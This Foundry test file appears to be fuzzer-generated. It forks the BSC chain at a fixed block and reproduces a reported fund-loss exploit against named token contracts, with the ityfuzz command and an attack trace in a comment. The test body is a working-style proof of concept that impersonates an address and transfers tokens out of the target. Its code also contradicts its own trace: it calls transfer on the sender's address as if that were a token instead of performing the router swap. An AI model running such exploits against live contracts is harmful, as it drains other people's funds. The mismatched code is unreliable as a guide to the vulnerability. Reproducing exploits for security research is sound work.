// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x1e813fa05739bf145c1f182cb950da7af046778d,0x1E813fA05739Bf145c1F182CB950dA7af046778d,0x2ecD8Ce228D534D8740617673F31b7541f6A0099,0xcfb7909b7eb27b71fdc482a2883049351a1749d7 -c bsc --onchain-block-number 19852596 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 0.307 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] Router.swapExactETHForTokens{value: 4722.3457 ether}(0, path:(WETH → 0x1E813fA05739Bf145c1F182CB950dA7af046778d), address(this), block.timestamp);
   └─[1] 0x1E813fA05739Bf145c1F182CB950dA7af046778d.transfer(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 5967.5770 ether)


 */

contract C1e81 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 19852596);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0x1E813fA05739Bf145c1F182CB950dA7af046778d, 4722.3457 ether);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x1E813fA05739Bf145c1F182CB950dA7af046778d).transfer(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 5967.5770 ether);
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
